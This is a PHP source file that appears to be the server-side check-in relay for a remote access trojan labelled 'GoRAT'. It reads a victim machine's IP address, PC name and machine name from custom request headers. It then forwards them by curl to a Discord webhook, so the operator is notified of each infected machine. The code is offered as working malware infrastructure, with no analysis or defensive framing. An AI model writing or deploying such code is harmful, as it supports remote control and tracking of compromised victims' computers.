<?php

if(isset($_SERVER['HTTP_X_IP']) && !empty($_SERVER['HTTP_X_IP'])) {
    if(isset($_SERVER['HTTP_X_NAME']) && !empty($_SERVER['HTTP_X_NAME'])) $pcname = $_SERVER['HTTP_X_NAME']; else $pcname = "";
    if(isset($_SERVER['HTTP_X_IP']) && !empty($_SERVER['HTTP_X_IP'])) $ip = $_SERVER['HTTP_X_IP']; else $ip = "None";
    if(isset($_SERVER['HTTP_X_MNAME']) && !empty($_SERVER['HTTP_X_MNAME'])) $machinename = $_SERVER['HTTP_X_MNAME']; else $ip = "None";

    $webhookurl = "<discord webhook uri>";
    $timestamp = date("c", strtotime("now"));
    $json_data = json_encode([
        "tts" => false,
        "embeds" => [
            [
                "title" => "GoRAT",
                "type" => "rich",
                "description" => "Received server request from **" . $ip ."**",
                "timestamp" => $timestamp,
                "color" => hexdec( "3366ff" ),
                "fields" => [
                    [
                        "name" => "IPv4",
                        "value" => $ip,
                        "inline" => true
                    ],
                    [
                        "name" => "PC Name",
                        "value" => $pcname . " (" . $machinename . ")",
                        "inline" => true
                    ]
                ]
            ]
        ]

    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


    $curlx = curl_init( $webhookurl );
    curl_setopt( $curlx, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt( $curlx, CURLOPT_POST, 1);
    curl_setopt( $curlx, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt( $curlx, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt( $curlx, CURLOPT_HEADER, 0);
    curl_setopt( $curlx, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec( $curlx );
    curl_close( $curlx );
}
?>
